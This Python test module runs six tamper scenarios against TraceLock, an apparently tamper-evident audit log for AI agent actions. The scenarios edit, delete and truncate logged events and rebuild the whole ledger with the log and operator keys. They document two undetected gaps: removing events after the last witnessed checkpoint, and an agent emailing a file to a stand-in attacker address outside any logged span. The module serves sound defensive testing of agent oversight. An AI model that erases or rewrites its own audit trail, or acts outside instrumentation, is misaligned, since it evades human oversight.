"""Six tamper scenarios against exported TraceLock artifacts.

Every scenario works on COPIES of the artifacts (trace, ledger db, witness-visible
STHs) and returns a ``Tampered`` bundle plus the expected outcome. ``run_all``
verifies each bundle with the standalone verifier and prints a markdown table.

The two NOT DETECTED rows are known limitations of the design, not bugs: they are
what the protocol cannot see, and the table reports them as such.

Run:  python -m attacks.tamper
"""
from __future__ import annotations

import argparse
import hashlib
import json
import shutil
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

from demo.agent_scripted import DEFAULT_SEED, Artifacts, produce_artifacts, run_session
from demo.tools import Toolbox
from tracelock.ledger import Ledger
from tracelock.signing import load_private_key
from tracelock.verify import verify_files
from tracelock.witness import Witness, WitnessError

DETECTED, NOT_DETECTED = "DETECTED", "NOT DETECTED"
OLD_RECIPIENT, NEW_RECIPIENT = "auditor@example.com", "attacker@example.net"


@dataclass
class Tampered:
    scenario: int
    name: str
    expected: str
    base: Artifacts  # whose public keys the verifier is given
    trace: Path
    ledger_db: Path
    witnessed_sths: Path
    notes: list[str] = field(default_factory=list)
    ground_truth: dict[str, Any] = field(default_factory=dict)

    def verify(self) -> dict[str, Any]:
        return verify_files(self.trace, self.base.log_pub, self.base.agent_pub,
                            self.base.witness_pubs, self.witnessed_sths)


@dataclass
class Row:
    scenario: int
    name: str
    expected: str
    actual: str
    caught_by: list[str]
    result: dict[str, Any]
    notes: list[str]

    @property
    def matches(self) -> bool:
        return self.expected == self.actual


# -- helpers ------------------------------------------------------------------------------


def _copy(base: Artifacts, work: Path) -> tuple[Path, Path, Path]:
    """Copy the three exported artifacts so the originals are never touched."""
    work.mkdir(parents=True, exist_ok=True)
    out = []
    for src, name in ((base.trace, "trace.jsonl"), (base.ledger_db, "ledger.db"),
                      (base.witnessed_sths, "witnessed_sths.json")):
        shutil.copyfile(src, work / name)
        out.append(work / name)
    return out[0], out[1], out[2]


def _read(path: Path) -> list[dict[str, Any]]:
    return [json.loads(l) for l in path.read_text(encoding="utf-8").splitlines()]


def _write(path: Path, lines: list[dict[str, Any]]) -> None:
    path.write_text("".join(json.dumps(l, sort_keys=True, ensure_ascii=False) + "\n" for l in lines),
                    encoding="utf-8")


def _email_index(lines: list[dict[str, Any]]) -> int:
    return next(i for i, l in enumerate(lines)
                if l["event"]["attributes"].get("gen_ai.tool.name") == "send_email_stub")


def _last_witnessed_size(sths_path: Path) -> int:
    return max(e["tree_size"] for e in json.loads(sths_path.read_text()))


# -- scenarios --------------------------------------------------------------------------------


def scenario_1(work: Path, base: Artifacts) -> Tampered:
    """Edit an event's content without the signing key."""
    t, db, s = _copy(base, work)
    lines = _read(t)
    i = _email_index(lines)
    lines[i]["event"]["attributes"]["gen_ai.tool.name"] = "calculator"  # rewrite what happened
    _write(t, lines)
    return Tampered(1, "Edit an event's content (no signing key)", DETECTED, base, t, db, s,
                    [f"edited seq {i}: send_email_stub recorded as calculator"])


def scenario_2(work: Path, base: Artifacts) -> Tampered:
    """Delete a mid-log event."""
    t, db, s = _copy(base, work)
    lines = _read(t)
    i = len(lines) // 2
    del lines[i]
    _write(t, lines)
    return Tampered(2, "Delete a mid-log event", DETECTED, base, t, db, s, [f"deleted seq {i}"])


def scenario_3(work: Path, base: Artifacts) -> Tampered:
    """Truncate the tail BEFORE the last witnessed STH (cuts events a witness has seen)."""
    t, db, s = _copy(base, work)
    lines = _read(t)
    keep = len(lines) - 3
    _write(t, lines[:keep])
    return Tampered(3, "Truncate tail before the last witnessed STH", DETECTED, base, t, db, s,
                    [f"kept {keep} of {len(lines)} events; last witnessed tree_size is "
                     f"{_last_witnessed_size(s)}"])


def scenario_4(work: Path, base: Artifacts) -> Tampered:
    """Truncate the tail AFTER the last witnessed STH: expected NOT detected."""
    art = produce_artifacts(work / "run", sth_interval=6, end_session=False)  # leaves a tail
    t, db, s = _copy(art, work / "copy")
    lines = _read(t)
    keep = _last_witnessed_size(s)
    _write(t, lines[:keep])
    return Tampered(4, "Truncate tail after the last witnessed STH", NOT_DETECTED, art, t, db, s,
                    [f"removed the last {len(lines) - keep} of {len(lines)} events, all after the "
                     f"last witnessed STH (tree_size {keep})"])


def scenario_5(work: Path, base: Artifacts) -> Tampered:
    """Full rewrite with every hash recomputed. The attacker holds the log AND operator
    (agent) keys, so signatures, hashes and STHs are all valid; only the witness key is out
    of reach. Expected: detected against the earlier witnessed STHs."""
    t, db, s = _copy(base, work)
    witness_dir = work / "witness_data"
    shutil.copytree(base.out_dir / "witness_data", witness_dir)  # a copy: the real one is untouched
    log_key = load_private_key(base.out_dir / "keys" / "log.key")
    agent_key = load_private_key(base.out_dir / "keys" / "agent.key")

    forged = _read(t)
    i = _email_index(forged)
    ev = forged[i]["event"]
    old_hash = ev["payload_hashes"]["input_sha256"]
    new_text = forged[i]["payloads"][old_hash].replace(OLD_RECIPIENT, NEW_RECIPIENT)
    new_hash = hashlib.sha256(new_text.encode()).hexdigest()
    ev["payload_hashes"]["input_sha256"] = new_hash  # recompute the payload hash
    forged[i]["payloads"] = {new_hash: new_text}

    rewritten_db = work / "rewritten_ledger.db"
    led = Ledger(rewritten_db, log_key, agent_key, sth_interval=0)
    for line in forged:  # a brand-new ledger: new leaf hashes, new tree, new STHs, new signatures
        event = {k: v for k, v in line["event"].items() if k != "seq"}
        led.append(event, [p.encode() for p in line.get("payloads", {}).values()])
    rewritten_trace = work / "rewritten_trace.jsonl"
    led.export_trace(rewritten_trace)
    head = led.latest_sth() or led.issue_sth()

    notes = [f"rewrote seq {i}: recipient {OLD_RECIPIENT} -> {NEW_RECIPIENT}; rebuilt the whole tree "
             f"and re-signed everything with the log and operator keys"]
    w = Witness(witness_dir, log_key.public_key())  # the attacker asks the real witness to cosign
    last = w.sths()[-1]["tree_size"]
    proof = [p.hex() for p in led.consistency_proof(min(last, head.tree_size), head.tree_size)]
    try:
        w.submit(head.to_json_dict(), proof)
        notes.append("WITNESS ACCEPTED THE REWRITTEN STH (unexpected)")
    except WitnessError as exc:
        notes.append(f"witness refused to cosign the rewritten STH: HTTP {exc.status}, {exc.message}")
    # The attacker keeps operating: one more event, so the head is larger than anything witnessed.
    # Now the witness gets a proper consistency proof, and it cannot verify against its old root.
    extra = {k: v for k, v in forged[-1]["event"].items() if k != "seq"}
    led.append({**extra, "name": "post-rewrite", "session_id": "post-rewrite"})
    head2 = led.issue_sth()
    proof2 = [p.hex() for p in led.consistency_proof(last, head2.tree_size)]
    try:
        w.submit(head2.to_json_dict(), proof2)
        notes.append("WITNESS ACCEPTED A LARGER REWRITTEN STH (unexpected)")
    except WitnessError as exc:
        notes.append(f"witness refused a larger STH with a consistency proof from its last STH: "
                     f"HTTP {exc.status}, {exc.message}")
    led.close()
    # The attacker cannot add witness signatures, so the witness-visible STHs stay as they were.
    return Tampered(5, "Full rewrite, attacker holds log + operator keys but not the witness key",
                    DETECTED, base, rewritten_trace, rewritten_db, s, notes)


def scenario_6(work: Path, base: Artifacts) -> Tampered:
    """An action that never produced a span (instrumentation bypass): expected NOT detected."""
    tools = Toolbox()

    def session(tracer: Any) -> None:
        run_session(tracer, DEFAULT_SEED, tools)
        # Executed directly, outside any span: nothing is ever handed to TraceLock.
        tools.send_email_stub(NEW_RECIPIENT, "exfiltrated", tools.read_file("notes.txt"))

    art = produce_artifacts(work / "run", session_fn=session)
    t, db, s = _copy(art, work / "copy")  # artifacts are untouched: there is nothing to tamper with
    in_trace = sum(1 for l in _read(t) if l["event"]["attributes"].get("gen_ai.tool.name") == "send_email_stub")
    truth = {"emails_actually_sent": len(tools.outbox), "emails_in_trace": in_trace,
             "unrecorded_recipient": tools.outbox[-1]["to"]}
    return Tampered(6, "Event never emitted (silent drop / instrumentation bypass)", NOT_DETECTED, art, t, db, s,
                    [f"agent really sent {truth['emails_actually_sent']} emails but the trace shows "
                     f"{in_trace}; the last went to {NEW_RECIPIENT}"], truth)


SCENARIOS: list[Callable[[Path, Artifacts], Tampered]] = [
    scenario_1, scenario_2, scenario_3, scenario_4, scenario_5, scenario_6,
]

LIMITATIONS = {
    4: "Events after the last witnessed STH are protected only by their own signatures. Nothing "
       "anchors them, so removing that tail is invisible. The checkpoint interval is the "
       "vulnerability window.",
    6: "TraceLock records only what the instrumentation hands it. A tamper-evident record of "
       "events is not a complete record of actions.",
}


# -- runner ---------------------------------------------------------------------------------------


def run_scenario(fn: Callable[[Path, Artifacts], Tampered], work: Path, base: Artifacts) -> Row:
    tampered = fn(work, base)
    result = tampered.verify()
    caught = [k for k, c in result["checks"].items() if c["status"] == "FAIL"]
    actual = DETECTED if result["overall"] == "FAIL" else NOT_DETECTED
    return Row(tampered.scenario, tampered.name, tampered.expected, actual, caught, result, tampered.notes)


def run_all(work_dir: str | Path) -> list[Row]:
    work = Path(work_dir)
    base = produce_artifacts(work / "base")
    return [run_scenario(fn, work / f"scenario_{i}", base) for i, fn in enumerate(SCENARIOS, 1)]


def format_table(rows: list[Row]) -> str:
    out = ["| # | Scenario | Expected | Actual | Caught by |", "|---|---|---|---|---|"]
    for r in rows:
        caught = ", ".join(f"`{c}`" for c in r.caught_by) if r.caught_by else "— (known limitation)"
        out.append(f"| {r.scenario} | {r.name} | {r.expected} | {r.actual} | {caught} |")
    out.append("")
    ok = all(r.matches for r in rows)
    out.append(f"All outcomes match expectations: {'yes' if ok else 'NO'}.")
    out.append("")
    out.append("Known limitations (reported honestly, not bugs):")
    for r in rows:
        if r.expected == NOT_DETECTED:
            out.append(f"- Scenario {r.scenario}: {LIMITATIONS[r.scenario]}")
    out.append("")
    out.append("Scenario notes:")
    for r in rows:
        for n in r.notes:
            out.append(f"- Scenario {r.scenario}: {n}")
        if r.result["first_broken_seq_range"]:
            lo, hi = r.result["first_broken_seq_range"]
            out.append(f"- Scenario {r.scenario}: first broken seq range reported by the verifier: {lo}-{hi}")
    return "\n".join(out)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="Run the six TraceLock tamper scenarios.")
    ap.add_argument("--work-dir", help="keep artifacts here (default: a temp dir that is deleted)")
    args = ap.parse_args(argv)
    if args.work_dir:
        rows = run_all(args.work_dir)
    else:
        with tempfile.TemporaryDirectory() as d:
            rows = run_all(d)
    print(format_table(rows))
    return 0 if all(r.matches for r in rows) else 1


if __name__ == "__main__":
    sys.exit(main())
